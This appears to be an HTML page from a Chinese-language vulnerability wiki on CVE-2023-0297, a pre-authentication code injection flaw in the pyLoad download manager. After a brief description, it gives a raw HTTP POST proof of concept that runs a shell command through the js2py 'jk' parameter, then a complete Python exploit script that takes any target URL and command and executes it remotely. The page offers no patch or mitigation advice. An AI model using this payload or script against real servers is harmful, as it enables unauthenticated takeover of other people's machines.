@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/pyLoad/pyLoad%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>pyLoad远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "pyLoad\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "exp\u811a\u672c", url: "#exp", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        rConfig v3.9.6 远程命令执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../postgres/CVE-2019-9193/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../postgres/CVE-2019-9193/README.zh-cn/" class="btn btn-xs btn-link">
+        PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="pyload">pyLoad远程代码执行漏洞<a class="headerlink" href="#pyload" title="Permanent link">&para;</a></h2>
+<p>pyLoad是一个用 Python 编写的免费和开源下载管理器，可用于NAS、下一代路由器、无头家庭服务器以及任何能够连接到互联网并支持 Python 编程语言的设备。</p>
+<p>pyLoad 存在代码注入漏洞，未经身份验证的攻击者可以通过滥用 js2py 功能执行任意 Python 代码。</p>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST flash/addcrypted2 HTTP/1.1
+Host:127.0.0.1
+Content-type: application/x-www-form-urlencoded
+
+jk=pyimport%20os;os.system(&quot;id&quot;);f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa
+</code></pre></div>
+<h2 id="exp">exp脚本<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)</span>
+<span class="c1"># Date: 06-10-2023</span>
+<span class="c1"># Credits: bAu @bauh0lz </span>
+<span class="c1"># Exploit Author: Gabriel Lima (0xGabe)</span>
+<span class="c1"># Vendor Homepage: https://pyload.net/</span>
+<span class="c1"># Software Link: https://github.com/pyload/pyload</span>
+<span class="c1"># Version: 0.5.0</span>
+<span class="c1"># Tested on: Ubuntu 20.04.6</span>
+<span class="c1"># CVE: CVE-2023-0297</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="w"> </span><span class="nn">argparse</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Target url.&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Command to execute.&#39;</span><span class="p">)</span>
+<span class="n">arguments</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">doRequest</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/flash/addcrypted2&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] Maybe the host is offline :&quot;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">()</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">runExploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/flash/addcrypted2&#39;</span>
+    <span class="k">if</span> <span class="s2">&quot; &quot;</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+        <span class="n">validCommand</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;%20&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">validCommand</span> <span class="o">=</span> <span class="n">cmd</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;jk=pyimport</span><span class="si">%20o</span><span class="s1">s;os.system(&quot;&#39;</span><span class="o">+</span><span class="n">validCommand</span><span class="o">+</span><span class="s1">&#39;&quot;);f=function</span><span class="si">%20f</span><span class="s1">2()</span><span class="si">{}</span><span class="s1">;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span>
+    <span class="n">test</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] The exploit has be executeded in target machine. &#39;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">targetUrl</span><span class="p">,</span> <span class="n">Command</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Check if target host is alive: &#39;</span> <span class="o">+</span> <span class="n">targetUrl</span><span class="p">)</span>
+    <span class="n">alive</span> <span class="o">=</span> <span class="n">doRequest</span><span class="p">(</span><span class="n">targetUrl</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">alive</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Host up, let&#39;s exploit! &quot;</span><span class="p">)</span>
+        <span class="n">runExploit</span><span class="p">(</span><span class="n">targetUrl</span><span class="p">,</span><span class="n">Command</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Host down! &#39;</span><span class="p">)</span>
+
+<span class="k">if</span><span class="p">(</span><span class="n">arguments</span><span class="o">.</span><span class="n">url</span> <span class="o">!=</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">arguments</span><span class="o">.</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">):</span>
+    <span class="n">targetUrl</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">url</span>
+    <span class="n">Command</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">cmd</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">targetUrl</span><span class="p">,</span> <span class="n">Command</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        rConfig v3.9.6 远程命令执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../postgres/CVE-2019-9193/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../postgres/CVE-2019-9193/README.zh-cn/" class="btn btn-xs btn-link">
+        PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
